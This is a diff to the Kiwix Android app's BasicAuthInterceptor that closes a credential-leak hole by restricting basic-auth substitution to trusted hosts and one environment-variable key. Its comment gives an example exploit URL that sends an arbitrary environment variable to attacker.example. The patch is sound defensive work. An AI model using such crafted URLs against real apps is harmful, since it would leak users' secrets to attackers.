@@ -25,12 +25,29 @@ import org.kiwix.kiwixmobile.core.reader.decodeUrl
 import org.kiwix.kiwixmobile.core.utils.files.Log
 import java.io.IOException
 
+/**
+ * Hosts allowed to trigger the `{{ENV_VAR}}@host` basic-auth substitution below.
+ *
+ * The book URL (and therefore this host) comes from remote catalog/library data,
+ * not from the app itself. Without this allowlist a catalog entry naming an
+ * arbitrary environment variable (`https://{{ANY_VAR}}@attacker.example/x.zim`)
+ * would make the app read that variable and send its value as Basic-auth
+ * credentials to a host the catalog author chooses. Restrict both the
+ * destination host and the accepted variable name to what this feature is
+ * actually used for.
+ */
+private val TRUSTED_BASIC_AUTH_HOSTS = setOf("dwds.de", "www.dwds.de")
+private val TRUSTED_BASIC_AUTH_KEYS = setOf("BASIC_AUTH_KEY")
+
 class BasicAuthInterceptor : Interceptor {
   @Throws(IOException::class)
   override fun intercept(chain: Interceptor.Chain): Response {
     val request: Request = chain.request()
     val url = request.url.toString()
-    if (url.isAuthenticationUrl) {
+    if (url.isAuthenticationUrl &&
+      request.url.host in TRUSTED_BASIC_AUTH_HOSTS &&
+      url.secretKey in TRUSTED_BASIC_AUTH_KEYS
+    ) {
       val userNameAndPassword = System.getenv(url.secretKey).orEmpty()
       val userName = userNameAndPassword.substringBefore(":", "")
       val password = userNameAndPassword.substringAfter(":", "")
